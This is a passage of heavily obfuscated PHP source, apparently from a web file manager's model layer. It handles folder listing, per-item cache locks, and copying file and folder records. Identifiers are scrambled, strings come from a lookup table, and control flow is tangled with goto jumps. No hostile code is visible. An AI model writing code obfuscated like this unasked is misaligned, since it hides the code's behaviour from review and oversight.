$this->sourceInfo($b¿…›ö¥‰[0], !0); $f¾Å–†°ë¿ = $a¶¢¼ÌìÕ­[$eÔƒ°ˆÀ…[28]]; } } } $f¾Å–†°ë¿ = $f¾Å–†°ë¿ ? $eÔƒ°ˆÀ…[8] . $f¾Å–†°ë¿ . $eÔƒ°ˆÀ…[8] : $eÔƒ°ˆÀ…[8]; return $f¾Å–†°ë¿; } protected function _listAppendUser(&$AªÀÓƒ«·Ë) { $Cº¹·ÍÏ¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÛÆò©ÊŸŠ = array_to_keyvalue($AªÀÓƒ«·Ë, $Cº¹·ÍÏ¢[33], $Cº¹·ÍÏ¢[378]); $F†”ù°Ãôö = array_to_keyvalue($AªÀÓƒ«·Ë, $Cº¹·ÍÏ¢[33], $Cº¹·ÍÏ¢[379]); $CŸÖÁ½¥šÂ = array_merge($CÛÆò©ÊŸŠ, $F†”ù°Ãôö); $a®¿½À´Şà = Model($Cº¹·ÍÏ¢[477])->userListInfo($CŸÖÁ½¥šÂ); foreach ($AªÀÓƒ«·Ë as &$c…²¿ ìì¶) { $a³•µóùÏ¦ = $c…²¿ ìì¶[$Cº¹·ÍÏ¢[378]]; $c…²¿ ìì¶[$Cº¹·ÍÏ¢[378]] = $a®¿½À´Şà[$a³•µóùÏ¦] ? $a®¿½À´Şà[$a³•µóùÏ¦] : !1; $a³•µóùÏ¦ = $c…²¿ ìì¶[$Cº¹·ÍÏ¢[379]]; $c…²¿ ìì¶[$Cº¹·ÍÏ¢[379]] = $a®¿½À´Şà[$a³•µóùÏ¦] ? $a®¿½À´Şà[$a³•µóùÏ¦] : !1; if (isset($c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]]) && $c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]][$Cº¹·ÍÏ¢[478]]) { $c ßÙ‚Ê¿£ = $GLOBALS[$Cº¹·ÍÏ¢[6]][$Cº¹·ÍÏ¢[84]][$Cº¹·ÍÏ¢[479]]; if ($c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]][$Cº¹·ÍÏ¢[480]] <= time() - $c ßÙ‚Ê¿£) { $this->metaSet($c…²¿ ìì¶[$Cº¹·ÍÏ¢[369]], $Cº¹·ÍÏ¢[478], null); $this->metaSet($c…²¿ ìì¶[$Cº¹·ÍÏ¢[369]], $Cº¹·ÍÏ¢[480], null); unset($c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]][$Cº¹·ÍÏ¢[478]]); continue; } $d¼Á±¥Ó× = $c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]][$Cº¹·ÍÏ¢[478]]; $c…²¿ ìì¶[$Cº¹·ÍÏ¢[417]][$Cº¹·ÍÏ¢[481]] = Model($Cº¹·ÍÏ¢[477])->getInfoSimpleOuter($d¼Á±¥Ó×); } } } public function parentLevelArray($c«£ÎßŸé·) { $C„óÃ¶í =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c«£ÎßŸé· = explode($C„óÃ¶í[47], trim($c«£ÎßŸé·, $C„óÃ¶í[47])); return array_remove_value($c«£ÎßŸé·, $C„óÃ¶í[468]); } public function listAll($d’ÇÙÇ¥’) { goto D©Ğ©›Ã…Å; F…á¦³—ùó: $EëŠÛ‚¿Ùª = array_to_keyvalue($EëŠÛ‚¿Ùª, $B„Á¥¨¬Æ[369]); $bŠ±âä÷§® = "\57{$D® ¸œƒ´¾[$B„Á¥¨¬Æ[28]]}\57"; $bŠ±âä÷§® = $bŠ±âä÷§® == $B„Á¥¨¬Æ[467] ? $B„Á¥¨¬Æ[8] : $bŠ±âä÷§®; goto e¢õ¹œË‹; e»²¾©­‘Å: $B‹ï’´…†– = $B„Á¥¨¬Æ[486]; $F¾Œ·æøÑ = "\x4c\105\x46\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\x69\x6f\137\x66\x69\x6c\145\x20\x66\x69\x6c\145\x20\x6f\x6e\40\x73\157\165\x72\143\x65\56\x66\x69\x6c\145\111\104\40\75\x20\146\x69\154\145\x2e\146\151\154\145\x49\x44"; $EëŠÛ‚¿Ùª = $this->alias($B„Á¥¨¬Æ[487])->field($B‹ï’´…†–)->where($b²ê‹´Ö¯ò)->join($F¾Œ·æøÑ)->select(); goto F‰ôæ¹È¡Ø; F‰ôæ¹È¡Ø: $this->_listAppendAuth($EëŠÛ‚¿Ùª); $this->_listAppendUser($EëŠÛ‚¿Ùª); $this->_listAppendPath($EëŠÛ‚¿Ùª); goto F…á¦³—ùó; e¢õ¹œË‹: $Aå³…Œ æ = array(); foreach ($EëŠÛ‚¿Ùª as $côø¤‘ÉŞ¸ => $Fçàõ®íö®) { goto BíôÕÂ¨®; A›§‘ƒ‘·à: if (!$Fçàõ®íö®[$B„Á¥¨¬Æ[370]]) { $Díª‚·ŠÜò[$B„Á¥¨¬Æ[419]] = $Fçàõ®íö®[$B„Á¥¨¬Æ[419]]; $Díª‚·ŠÜò[$B„Á¥¨¬Æ[489]] = $Fçàõ®íö®[$B„Á¥¨¬Æ[75]]; } $Aå³…Œ æ[] = $Díª‚·ŠÜò; goto B¸”ïàÍâ; dÛ’æÑª«ò: $fÚø«èŠ‰ = str_replace($B„Á¥¨¬Æ[467], $B„Á¥¨¬Æ[8], $fÚø«èŠ‰); $fÚø«èŠ‰ = str_replace($B„Á¥¨¬Æ[467], $B„Á¥¨¬Æ[8], $fÚø«èŠ‰); $Díª‚·ŠÜò = array($B„Á¥¨¬Æ[387] => str_replace($B„Á¥¨¬Æ[467], $B„Á¥¨¬Æ[8], $fÚø«èŠ‰), $B„Á¥¨¬Æ[488] => intval($Fçàõ®íö®[$B„Á¥¨¬Æ[370]]), $B„Á¥¨¬Æ[391] => $this->pathInfoFilter($Fçàõ®íö®, !0)); goto A›§‘ƒ‘·à; BíôÕÂ¨®: $e‡óË­ãÚ = $this->parentLevelArray($Fçàõ®íö®[$B„Á¥¨¬Æ[459]]); array_shift($e‡óË­ãÚ); $fÚø«èŠ‰ = $bŠ±âä÷§®; goto a„èªêÀÊù; a„èªêÀÊù: for ($EÈÌ£Ø‡ñ = 0; $EÈÌ£Ø‡ñ < count($e‡óË­ãÚ); $EÈÌ£Ø‡ñ++) { $fÚø«èŠ‰ .= $EëŠÛ‚¿Ùª[$e‡óË­ãÚ[$EÈÌ£Ø‡ñ]][$B„Á¥¨¬Æ[28]] . $B„Á¥¨¬Æ[8]; } $fÚø«èŠ‰ .= $Fçàõ®íö®[$B„Á¥¨¬Æ[28]]; if ($Fçàõ®íö®[$B„Á¥¨¬Æ[370]]) { $fÚø«èŠ‰ .= $B„Á¥¨¬Æ[8]; } goto dÛ’æÑª«ò; B¸”ïàÍâ: } return $Aå³…Œ æ; goto cùç¨¼¦¾à; D©Ğ©›Ã…Å: $B„Á¥¨¬Æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D® ¸œƒ´¾ = $this->sourceInfo($d’ÇÙÇ¥’); $b²ê‹´Ö¯ò = array($B„Á¥¨¬Æ[482] => array($B„Á¥¨¬Æ[483], $D® ¸œƒ´¾[$B„Á¥¨¬Æ[459]] . $d’ÇÙÇ¥’ . $B„Á¥¨¬Æ[484]), $B„Á¥¨¬Æ[485] => 0); goto e»²¾©­‘Å; cùç¨¼¦¾à: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BİÀŒ‡Š·) { goto bš½¯ßÓÄÊ; DÌØ˜É¢: $FÇ…Ğ…‹¨ª = 1; $this->_lockEvent($BİÀŒ‡Š·, array($fË¥ØëŒÉ—[491], $fË¥ØëŒÉ—[492]), $FÇ…Ğ…‹¨ª); $this->_lockParent($BİÀŒ‡Š·, array($fË¥ØëŒÉ—[492]), $FÇ…Ğ…‹¨ª); goto dÇø˜Ûõï; dÇø˜Ûõï: $this->_lockEvent($BİÀŒ‡Š·, array($fË¥ØëŒÉ—[493], $fË¥ØëŒÉ—[494]), $FÇ…Ğ…‹¨ª); $this->_lockCheckEnd($fË¥ØëŒÉ—[490], $BİÀŒ‡Š·); goto FÑ¿š§‹ïà; bš½¯ßÓÄÊ: $fË¥ØëŒÉ— =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $this->_lockCheck($fË¥ØëŒÉ—[490], $BİÀŒ‡Š·); goto DÌØ˜É¢; FÑ¿š§‹ïà: } public function lockCopyEnd($BÆ…ªŞâÀ¼) { $EÅø—¯Ó©‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $eˆ‘ßÊÛá = 0; $this->_lockEvent($BÆ…ªŞâÀ¼, array($EÅø—¯Ó©‘[491], $EÅø—¯Ó©‘[492]), $eˆ‘ßÊÛá); $this->_lockParent($BÆ…ªŞâÀ¼, array($EÅø—¯Ó©‘[492]), $eˆ‘ßÊÛá); $this->_lockEvent($BÆ…ªŞâÀ¼, array($EÅø—¯Ó©‘[493], $EÅø—¯Ó©‘[494]), $eˆ‘ßÊÛá); } public function lockWriteStart($eøÂâçã¸­, $dÂ²º¨©ÁÂ = '') { goto cš¬µˆ«’‘; a®¤‚¤ßÃÎ: $this->_lockParent($eøÂâçã¸­, array($F¦´Çññµ[490], $F¦´Çññµ[492]), $fî÷ô); $this->_lockCheckEnd($F¦´Çññµ[491], $eøÂâçã¸­); goto bà¶­Ì£Ş; e³á­éºŒ±: $fî÷ô = 1; $this->_lockKey($F¦´Çññµ[495] . $eøÂâçã¸­ . $F¦´Çññµ[91] . $dÂ²º¨©ÁÂ, $fî÷ô); $this->_lockEvent($eøÂâçã¸­, array($F¦´Çññµ[490], $F¦´Çññµ[492]), $fî÷ô); goto a®¤‚¤ßÃÎ; cš¬µˆ«’‘: $F¦´Çññµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $this->_lockCheck($F¦´Çññµ[491], $eøÂâçã¸­); goto e³á­éºŒ±; bà¶­Ì£Ş: } public function lockWriteEnd($fÃ¨é¥‚Àò, $f»ÍÉïçÓ¢ = '') { $F“†´ç‹ÒÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $fœ„–õŞ¹ø = 0; $this->_lockKey($F“†´ç‹ÒÁ[495] . $fÃ¨é¥‚Àò . $F“†´ç‹ÒÁ[91] . $f»ÍÉïçÓ¢, $fœ„–õŞ¹ø); $this->_lockEvent($fÃ¨é¥‚Àò, array($F“†´ç‹ÒÁ[490], $F“†´ç‹ÒÁ[492]), $fœ„–õŞ¹ø); $this->_lockParent($fÃ¨é¥‚Àò, array($F“†´ç‹ÒÁ[490], $F“†´ç‹ÒÁ[492]), $fœ„–õŞ¹ø); } public function lockMoveStart($aİö–‹) { goto D×³™Ø©áã; cÑóîİÓ†Ó: $CøêÖÌ¨Ş = 1; $this->_lockKey($AäĞÔõÆŞ[496] . $aİö–‹, $CøêÖÌ¨Ş); $this->_lockEvent($aİö–‹, array($AäĞÔõÆŞ[490], $AäĞÔõÆŞ[491]), $CøêÖÌ¨Ş); goto bÂ†äÉ °; D×³™Ø©áã: $AäĞÔõÆŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $this->_lockCheck($AäĞÔõÆŞ[492], $aİö–‹); goto cÑóîİÓ†Ó; bÂ†äÉ °: $this->_lockParent($aİö–‹, array($AäĞÔõÆŞ[490], $AäĞÔõÆŞ[492]), $CøêÖÌ¨Ş); $this->_lockEvent($aİö–‹, array($AäĞÔõÆŞ[497], $AäĞÔõÆŞ[493], $AäĞÔõÆŞ[494]), $CøêÖÌ¨Ş); $this->_lockCheckEnd($AäĞÔõÆŞ[492], $aİö–‹); goto A‡Åñ±ï; A‡Åñ±ï: } public function lockMoveEnd($cªÎÍ¯±ê) { goto FÈÊËß—Î; DÔ ¾Ò‡: $this->_lockKey($eğ‡ÄğÜİ¬[496] . $cªÎÍ¯±ê, $CÙäå¡§…‚); $this->_lockEvent($cªÎÍ¯±ê, array($eğ‡ÄğÜİ¬[490], $eğ‡ÄğÜİ¬[491]), $CÙäå¡§…‚); $this->_lockParent($cªÎÍ¯±ê, array($eğ‡ÄğÜİ¬[490], $eğ‡ÄğÜİ¬[492]), $CÙäå¡§…‚); goto B”¨’—ÎÖ¾; FÈÊËß—Î: $eğ‡ÄğÜİ¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->allowLock()) { return; } $CÙäå¡§…‚ = 0; goto DÔ ¾Ò‡; B”¨’—ÎÖ¾: $this->_lockEvent($cªÎÍ¯±ê, array($eğ‡ÄğÜİ¬[497], $eğ‡ÄğÜİ¬[493], $eğ‡ÄğÜİ¬[494]), $CÙäå¡§…‚); goto dî‰ÕÌ®Ÿ®; dî‰ÕÌ®Ÿ®: } private function _lockCheck($AîÑĞº‰‚Ö, $c¬´²ŞÊ» ) { goto eÆ¾Í·êÆ; DòÄª¡¸Œğ: CacheLock::setErrorMsg($c¼¦Î÷…½£[157] . htmlspecialchars($B¾‹õ„ÃÕ[$c¼¦Î÷…½£[28]]) . $c¼¦Î÷…½£[476] . $AŠÒî“áˆà); $this->_lockKey($e…Å–¹¤î, 1); $this->_lockKey($e…Å–¹¤î, 0); goto B¬¼ï÷ò§ï; Dñ÷ÆêØ…Õ: $this->_lockTimeStart[$e…Å–¹¤î] = timeFloat(); if (!is_array($B¾‹õ„ÃÕ)) { return; } $AŠÒî“áˆà = LNG($c¼¦Î÷…½£[498]); goto DòÄª¡¸Œğ; eÆ¾Í·êÆ: $c¼¦Î÷…½£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B¾‹õ„ÃÕ = $this->sourceInfo($c¬´²ŞÊ» ); $e…Å–¹¤î = $AîÑĞº‰‚Ö . $c¼¦Î÷…½£[91] . $c¬´²ŞÊ» ; goto Dñ÷ÆêØ…Õ; B¬¼ï÷ò§ï: $a¿î¸àæ®Ù = array_reverse($this->parentLevelArray($B¾‹õ„ÃÕ[$c¼¦Î÷…½£[459]])); foreach ($a¿î¸àæ®Ù as $Dô»âÑÀ’Ö) { $e…Å–¹¤î = $AîÑĞº‰‚Ö . $c¼¦Î÷…½£[499] . $Dô»âÑÀ’Ö; if (CacheLock::lockGet($c¼¦Î÷…½£[500] . $e…Å–¹¤î)) { $B¾‹õ„ÃÕ = $this->sourceInfo($Dô»âÑÀ’Ö); CacheLock::setErrorMsg($c¼¦Î÷…½£[157] . htmlspecialchars($B¾‹õ„ÃÕ[$c¼¦Î÷…½£[28]]) . $c¼¦Î÷…½£[476] . $AŠÒî“áˆà); $this->_lockKey($e…Å–¹¤î, 1); $this->_lockKey($e…Å–¹¤î, 0); } } goto F†Ä…·°êØ; F†Ä…·°êØ: } private function _lockCheckEnd($fÀö¿ã›ìî, $Dã±¬“½ò) { goto a¨±®Éß‰°; E¾™¿İ: if (!isset($this->_lockTimeStart[$eå²‹¯âÔ‰])) { return; } $FêÇöË•ç¸ = timeFloat() - $this->_lockTimeStart[$eå²‹¯âÔ‰]; unset($this->_lockTimeStart[$eå²‹¯âÔ‰]); goto BË‘¾†ìîÌ; BË‘¾†ìîÌ: if ($FêÇöË•ç¸ > 0.5) { unset(self::$cacheSourceInfo[$bŒ™Å”Ó[410] . $Dã±¬“½ò]); } $a›²œ©î¡„ = $this->sourceInfo($Dã±¬“½ò); if (!$a›²œ©î¡„) { show_json(LNG($bŒ™Å”Ó[101]), !1); } goto B¯¨¥×Ü·É; a¨±®Éß‰°: $bŒ™Å”Ó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eå²‹¯âÔ‰ = $fÀö¿ã›ìî . $bŒ™Å”Ó[91] . $Dã±¬“½ò; CacheLock::setErrorMsg($bŒ™Å”Ó[361]); goto E¾™¿İ; B¯¨¥×Ü·É: } private function _lockParent($BË¤İù‘«, $A…ÎÈ°Ã¦‰, $B’˜œ›Šï) { if (!$this->autoLockSet) { return; } $A«”÷¸´­ = $this->sourceInfo($BË¤İù‘«); if (!is_array($A«”÷¸´­)) { return; } $FŒò¾¯Íé = array_reverse($this->parentLevelArray($A«”÷¸´­[$_SERVER[³‘’¼äÑ™ÔÍ][459]])); foreach ($FŒò¾¯Íé as $BÏŒÑ¥ä) { $this->_lockEvent($BÏŒÑ¥ä, $A…ÎÈ°Ã¦‰, $B’˜œ›Šï); } } private function _lockEvent($D°‡âÉùÁ¢, $c˜ë¤‰æÑ, $eƒŠ°‚£À) { $aÁ¶ƒ˜‹Çè =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->autoLockSet) { return; } foreach ($c˜ë¤‰æÑ as $cªÚÎ‹‹“ç) { $E…¸×ñîÃŸ = $cªÚÎ‹‹“ç . $aÁ¶ƒ˜‹Çè[91] . $D°‡âÉùÁ¢; if ($eƒŠ°‚£À && CacheLock::lockGet($aÁ¶ƒ˜‹Çè[500] . $E…¸×ñîÃŸ)) { continue; } $this->_lockKey($E…¸×ñîÃŸ, $eƒŠ°‚£À); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($fÙŒÌ®Î™Ï, $cò­ğ¾×À = 1) { $C¥†¿£„ÜÇ = $_SERVER[³‘’¼äÑ™ÔÍ][500] . md5($fÙŒÌ®Î™Ï); if ($cò­ğ¾×À) { if (isset(self::$_lockItemArr[$C¥†¿£„ÜÇ])) { return; } self::$_lockItemArr[$C¥†¿£„ÜÇ] = 1; CacheLock::lock($C¥†¿£„ÜÇ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C¥†¿£„ÜÇ])) { return; } unset(self::$_lockItemArr[$C¥†¿£„ÜÇ]); CacheLock::unlock($C¥†¿£„ÜÇ); } } public function isParentOf($Cí»‹ŸÉˆ”, $F™Ğ‰ˆÓŠ…) { goto E¢•é¾¿‚; eÀÅÜÎäÎ: return $E£™ìÕà§¤; goto D›äâ°çà¹; aï½øïá¨Æ: $eÎÉë¿¢ÇÕ = $AâÔÇ¥øº«[$CË­Ï”Ö÷Û[459]] . $AâÔÇ¥øº«[$CË­Ï”Ö÷Û[369]] . $CË­Ï”Ö÷Û[47]; $c‚§Â½èŒŞ = $B¶ë¼–’ç™[$CË­Ï”Ö÷Û[459]] . $B¶ë¼–’ç™[$CË­Ï”Ö÷Û[369]] . $CË­Ï”Ö÷Û[47]; $E£™ìÕà§¤ = strpos($c‚§Â½èŒŞ, $eÎÉë¿¢ÇÕ) === 0; goto eÀÅÜÎäÎ; E¢•é¾¿‚: $CË­Ï”Ö÷Û =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AâÔÇ¥øº« = $this->sourceInfo($Cí»‹ŸÉˆ”); $B¶ë¼–’ç™ = $this->sourceInfo($F™Ğ‰ˆÓŠ…); goto aï½øïá¨Æ; D›äâ°çà¹: } private $targetIsDelete = 0; public function copy($e…Ğƒêç, $B®õÑñçÑ, $dÅ†£òàá = REPEAT_REPLACE, $AÄ…¸Õ÷†¶ = '') { goto E²®Šİ–º¥; fááÂõØø˜: if ($e‘Éç µŒ˜[$CÊ™„øï›[370]] == $CÊ™„øï›[83] && $fçù±õåœ == $bÓêÛ‡È¿±) { $this->folderSizeResetChildren($fçù±õåœ); } Model($CÊ™„øï›[504])->addAll($EËÈ‰‡¥í[$CÊ™„øï›[502]], array(), !0); if ($fçù±õåœ != $bÓêÛ‡È¿± || $e‘Éç µŒ˜[$CÊ™„øï›[370]] == $CÊ™„øï›[83]) { Model($CÊ™„øï›[505])->eventCopy($bÓêÛ‡È¿±); } goto aäÓ¦ïÛÎò; E²®Šİ–º¥: $CÊ™„øï› =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‘Éç µŒ˜ = $this->sourceInfo($e…Ğƒêç); $AĞõêçîÚ¾ = $this->sourceInfo($B®õÑñçÑ); goto cä…£Ò¿ƒ„; eâºá‚ÔÖ: $this->targetIsDelete = intval($e‘Éç µŒ˜[$CÊ™„øï›[397]]); $fçù±õåœ = $this->fileNameExistCache($B®õÑñçÑ, $e‘Éç µŒ˜[$CÊ™„øï›[28]]); $bÓêÛ‡È¿± = $this->_copy($e…Ğƒêç, $B®õÑñçÑ, $dÅ†£òàá, $EËÈ‰‡¥í, !0, $AÄ…¸Õ÷†¶); goto DÖïĞß¿Š¤; aäÓ¦ïÛÎò: $this->saveAll($EËÈ‰‡¥í[$CÊ™„øï›[503]]); Model($CÊ™„øï›[167])->linkAdd($EËÈ‰‡¥í[$CÊ™„øï›[501]]); $this->folderSizeReset($B®õÑñçÑ); goto bê˜º»ˆÀ…; F¾æ¼çèõİ: $this->lockCopyStart($e…Ğƒêç); $this->lockWriteStart($B®õÑñçÑ, $C³‘«˜ÊŞ); $EËÈ‰‡¥í = array($CÊ™„øï›[501] => array(), $CÊ™„øï›[502] => array(), $CÊ™„øï›[503] => array()); goto eâºá‚ÔÖ; DÖïĞß¿Š¤: $this->_childrenListClear(); $this->lockCopyEnd($e…Ğƒêç); $this->lockWriteEnd($B®õÑñçÑ, $C³‘«˜ÊŞ); goto fááÂõØø˜; cä…£Ò¿ƒ„: if (!$e‘Éç µŒ˜ || !$AĞõêçîÚ¾ || $AĞõêçîÚ¾[$CÊ™„øï›[370]] != $CÊ™„øï›[83]) { return !1; } if ($this->isParentOf($e…Ğƒêç, $B®õÑñçÑ)) { return !1; } $C³‘«˜ÊŞ = $AÄ…¸Õ÷†¶ ? $AÄ…¸Õ÷†¶ : $e‘Éç µŒ˜[$CÊ™„øï›[28]]; goto F¾æ¼çèõİ; bê˜º»ˆÀ…: $this->updateModifyTime($B®õÑñçÑ); return $bÓêÛ‡È¿±; goto Aª®³×ÊÁ½; Aª®³×ÊÁ½: } private function _copy($CÏëäŠ„Úë, $dÙƒĞ¬àåÔ, $c­¯Ô®óà, &$D‹…İ§ÀéÂ, $E‹çË¿¦×, $aƒêÆòÙÙ¯ = '') { goto E„¢­±¡´±; E„¢­±¡´±: $AÀ¥ ¬ïêí =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F»«÷¯å×Ÿ = $this->sourceInfoCache($CÏëäŠ„Úë); $CÌèù³¥¸  = $F»«÷¯å×Ÿ[$AÀ¥ ¬ïêí[370]] == $AÀ¥ ¬ïêí[83]; goto eœÆ†°™¹Æ; eœÆ†°™¹Æ: $b’‹ßÓµ‡Î = $aƒêÆòÙÙ¯ ? $aƒêÆòÙÙ¯ : $F»«÷¯å×Ÿ[$AÀ¥ ¬ïêí[28]]; $F«˜Ô½ó´ö = $this->fileNameExistCache($dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î); if ($E‹çË¿¦×) { $this->_childrenAllMake($CÏëäŠ„Úë); if ($CÌèù³¥¸  && $F«˜Ô½ó´ö) { $this->_childrenAllMake($F«˜Ô½ó´ö); } } goto aÍ±ÑÂæ¸’; b²ğÑÚóåØ: return $BòÆ¹ÏİÍ; goto b«ê³ƒ½Áğ; aÍ±ÑÂæ¸’: if (!$F«˜Ô½ó´ö) { return $this->_copyCreate($CÏëäŠ„Úë, $dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î, $D‹…İ§ÀéÂ); } $BòÆ¹ÏİÍ = $F«˜Ô½ó´ö; if ($CÌèù³¥¸ ) { if ($c­¯Ô®óà == REPEAT_RENAME_FOLDER) { $b’‹ßÓµ‡Î = $this->fileNameAutoCache($dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î, $c­¯Ô®óà, $CÌèù³¥¸ ); $BòÆ¹ÏİÍ = $this->_copyCreate($CÏëäŠ„Úë, $dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î, $D‹…İ§ÀéÂ); } else { $a•’”ó½Û = $this->_childrenList($CÏëäŠ„Úë); foreach ($a•’”ó½Û as $aÓ–š™Ï) { $this->_copy($aÓ–š™Ï[$AÀ¥ ¬ïêí[369]], $F«˜Ô½ó´ö, $c­¯Ô®óà, $D‹…İ§ÀéÂ, !1); } } } else { if ($c­¯Ô®óà == REPEAT_RENAME || $c­¯Ô®óà == REPEAT_RENAME_FOLDER) { $b’‹ßÓµ‡Î = $this->fileNameAutoCache($dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î, $c­¯Ô®óà, $CÌèù³¥¸ ); $BòÆ¹ÏİÍ = $this->_copyCreate($CÏëäŠ„Úë, $dÙƒĞ¬àåÔ, $b’‹ßÓµ‡Î, $D‹…İ§ÀéÂ); } else { if ($c­¯Ô®óà == REPEAT_REPLACE) { $Cƒ•‹ ñ®š = $this->sourceInfoCache($F«˜Ô½ó´ö); $d’Î¬ï°” = $this->fileHistory($Cƒ•‹ ñ®š, $F»«÷¯å×Ÿ[$AÀ¥ ¬ïêí[419]], $F»«÷¯å×Ÿ[$AÀ¥ ¬ïêí[77]]); if ($d’Î¬ï°”) { $D‹…İ§ÀéÂ[$AÀ¥ ¬ïêí[501]][] = $F»«÷¯å×Ÿ[$AÀ¥ ¬ïêí[419]]; } } else { if ($c­¯Ô®óà == REPEAT_SKIP) { } } } Hook::trigger($AÀ¥ ¬ïêí[506], array($AÀ¥ ¬ïêí[507], $F»«÷¯å×Ÿ, 0)); } goto b²ğÑÚóåØ; b«ê³ƒ½Áğ: } private function _copyCreate($eŠÂòŠó, $f‹ºšÕÉäÈ, $cäçøˆõ¶Ò, &$b¿¨‘£Ú”) { goto bÄ¿Œ²·¢¦; dî­Üµ²Ö¶: $this->chunkEventSet($bÕ‡¿Ú†·‘[515], array($bÕ‡¿Ú†·‘[516], $DèõÉÇÈ©Ó, $F®‡óƒ‹³º)); $this->saveAll($d‹–’…Ù™§); return $b­™¸…Ö¦¼; goto d„È½±âÚË; D—àÈ°ùÃÃ: $DèõÉÇÈ©Ó = $this->_makeItemData($F«åĞ«³„¬, $FÚª°ãõÍ¤, $cäçøˆõ¶Ò); Hook::trigger($bÕ‡¿Ú†·‘[508], $DèõÉÇÈ©Ó); Hook::trigger($bÕ‡¿Ú†·‘[509], array($bÕ‡¿Ú†·‘[510], $DèõÉÇÈ©Ó, 0)); goto fÆÒ‚Çº‚ğ; B¯×ÚÔºÖ: $this->addAll($FäªµŞºõ, array(), !1); $FÃíÇ‘‰ã = $this->where(array($bÕ‡¿Ú†·‘[461] => $b­™¸…Ö¦¼))->select(); $b¿éíÎìÌ = $this->_childrenMakeRelation($F¢†É¦ËÏ§, $FÃíÇ‘‰ã); goto F¨ÜÈÙ®ÑÀ; fÆÒ‚Çº‚ğ: $b­™¸…Ö¦¼ = $this->add($DèõÉÇÈ©Ó); $aÚÏŠ«Ç£¬ = array($bÕ‡¿Ú†·‘[369] => $b­™¸…Ö¦¼, $bÕ‡¿Ú†·‘[28] => $cäçøˆõ¶Ò); $this->_copyApplyMeta($aÚÏŠ«Ç£¬, $b¿¨‘£Ú”); goto DĞÄäïˆÚ÷; F¨ÜÈÙ®ÑÀ: $b¿éíÎìÌ[$eŠÂòŠó] = $b­™¸…Ö¦¼; $f‚àò‰îÖ = array(); $d‹–’…Ù™§ = array(); goto F¨õ‡åš¹©; bÄ¿Œ²·¢¦: $bÕ‡¿Ú†·‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F«åĞ«³„¬ = $this->sourceInfoCache($eŠÂòŠó); $FÚª°ãõÍ¤ = $this->sourceInfoCache($f‹ºšÕÉäÈ); goto D—àÈ°ùÃÃ; F¨õ‡åš¹©: foreach ($FÃíÇ‘‰ã as $BÑ††¢Øä) { $Eà¯·«‰”¨ = $BÑ††¢Øä[$bÕ‡¿Ú†·‘[369]]; $FŒŒÏ¿¤Â = $this->_childrenMatch($b¿éíÎìÌ, $BÑ††¢Øä, $a½Í“‡—); $f‚àò‰îÖ[] = array($bÕ‡¿Ú†·‘[369], $Eà¯·«‰”¨, $bÕ‡¿Ú†·‘[461], $FŒŒÏ¿¤Â[$bÕ‡¿Ú†·‘[461]]); $d‹–’…Ù™§[] = array($bÕ‡¿Ú†·‘[369], $Eà¯·«‰”¨, $bÕ‡¿Ú†·‘[459], $FŒŒÏ¿¤Â[$bÕ‡¿Ú†·‘[459]]); $this->_copyApplyMeta($BÑ††¢Øä, $b¿¨‘£Ú”); if ($BÑ††¢Øä[$bÕ‡¿Ú†·‘[370]] != $bÕ‡¿Ú†·‘[83]) { $b¿¨‘£Ú”[$bÕ‡¿Ú†·‘[501]][] = $BÑ††¢Øä[$bÕ‡¿Ú†·‘[419]]; } } $this->chunkEventSet($bÕ‡¿Ú†·‘[513], array($bÕ‡¿Ú†·‘[514], $DèõÉÇÈ©Ó, $F®‡óƒ‹³º)); $this->saveAll($f‚àò‰îÖ); goto dî­Üµ²Ö¶; AÓËÓÆ‘†Ä: $a½Í“‡— = $this->sourceInfo($b­™¸…Ö¦¼); foreach ($F¢†É¦ËÏ§ as $BÑ††¢Øä) { $aî…¢¬–ƒ¼ = $this->_makeItemData($BÑ††¢Øä, $a½Í“‡—, $BÑ††¢Øä[$bÕ‡¿Ú†·‘[28]]); $aî…¢¬–ƒ¼[$bÕ‡¿Ú†·‘[459]] = $BÑ††¢Øä[$bÕ‡¿Ú†·‘[459]]; $FäªµŞºõ[] = $aî…¢¬–ƒ¼; } $this->chunkEventSet($bÕ‡¿Ú†·‘[511], array($bÕ‡¿Ú†·‘[512], $DèõÉÇÈ©Ó, $F®‡óƒ‹³º)); goto B¯×ÚÔºÖ; B¸»¶Öø»î: $this->_childrenListAll($eŠÂòŠó, $F¢†É¦ËÏ§); $F®‡óƒ‹³º = count($F¢†É¦ËÏ§); if ($F®‡óƒ‹³º == 0) { return $b­™¸…Ö¦¼; } goto AÓËÓÆ‘†Ä; DĞÄäïˆÚ÷: if ($F«åĞ«³„¬[$bÕ‡¿Ú†·‘[370]] != $bÕ‡¿Ú†·‘[83]) { $b¿¨‘£Ú”[$bÕ‡¿Ú†·‘[501]][] = 